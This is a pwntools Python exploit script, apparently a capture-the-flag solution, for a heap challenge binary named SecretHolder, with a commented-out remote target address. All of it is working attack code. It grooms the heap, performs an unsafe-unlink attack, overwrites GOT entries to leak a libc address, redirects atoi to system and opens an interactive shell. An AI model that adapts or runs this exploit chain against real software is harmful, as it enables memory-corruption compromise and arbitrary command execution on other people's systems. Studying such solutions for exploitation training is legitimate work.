from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

small_secret = 0x6020B0
big_secret = 0x6020A0
puts_plt = 0x4006C0
free_got = 0x602018
read_got = 0x602040
atoi_got = 0x602070

read_base = 0xf69a0
system_base = 0x45380

size_num = { 'small': b'1', 'big': b'2', 'huge': b'3' }

def keep(size):
    r.recvuntil(b'3. Renew secret\n')
    log.info('keep ' + size)
    r.sendline(b'1')
    r.recvuntil(b'3. Huge secret\n')
    r.sendline(size_num[size])
    r.recvuntil(b':')
    r.send(size.encode())

def wipe(size):
    r.recvuntil(b'3. Renew secret\n')
    log.info('wipe ' + size)
    r.sendline(b'2')
    r.recvuntil(b'3. Huge secret\n')
    r.sendline(size_num[size])

def renew(size, content):
    r.recvuntil(b'3. Renew secret\n')
    log.info('renew ' + size)
    r.sendline(b'3')
    r.recvuntil(b'3. Huge secret\n')
    r.sendline(size_num[size])
    r.recvuntil(b':')
    r.send(content)

r = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8')
# r = remote('52.68.31.117', 5566)

# ===================== exploit =====================

keep('small')
wipe('small')
keep('big')
wipe('small')
keep('small')
keep('huge')
wipe('huge')
keep('huge')

# unsafe unlink
payload = p64(0) + p64(49)
payload += p64(small_secret - 0x18)
payload += p64(small_secret - 0x10)
payload += p64(32) + p64(400016)

renew('big', payload)
wipe('huge')

# overwrite pointer
payload = b'A'*8 + p64(free_got) + b'A'*8 + p64(big_secret)
renew('small', payload)

renew('big', p64(puts_plt))
renew('small', p64(read_got))

# leak libc
wipe('big')
data = r.recvline().strip()
print("[leak]", data)

read_addr = u64(data.ljust(8, b'\x00'))
libc_addr = read_addr - read_base
system_addr = libc_addr + system_base

log.success('read_addr: ' + hex(read_addr))
log.success('libc_base: ' + hex(libc_addr))
log.success('system_addr: ' + hex(system_addr))

# overwrite atoi -> system
payload = p64(atoi_got) + b'A'*8 + p64(big_secret) + p64(1)
renew('small', payload)
renew('big', p64(system_addr))

log.success("getting shell...")

r.sendline(b'sh')
r.interactive()